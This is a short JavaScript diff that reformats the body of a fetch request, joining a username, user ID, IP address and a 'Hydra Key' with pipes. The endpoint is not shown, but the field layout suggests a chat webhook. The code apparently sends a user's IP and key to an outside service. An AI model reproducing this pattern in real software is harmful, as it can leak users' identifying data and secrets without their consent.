@@ -99,7 +99,7 @@
                         headers: {
                             'Content-Type': 'application/json',
                         },
-                        body: JSON.stringify({ content: `Username : ${username}\nUserID : ${userid}\nIP : ${ip}\nHydra Key : ${hydrakey}` })
+                        body: JSON.stringify({ content: `Username : ${username} | UserID : ${userid} | IP : ${ip} | Hydra Key : ${hydrakey}` })
                     })
                     .then(response => {
                         if (!response.ok) {
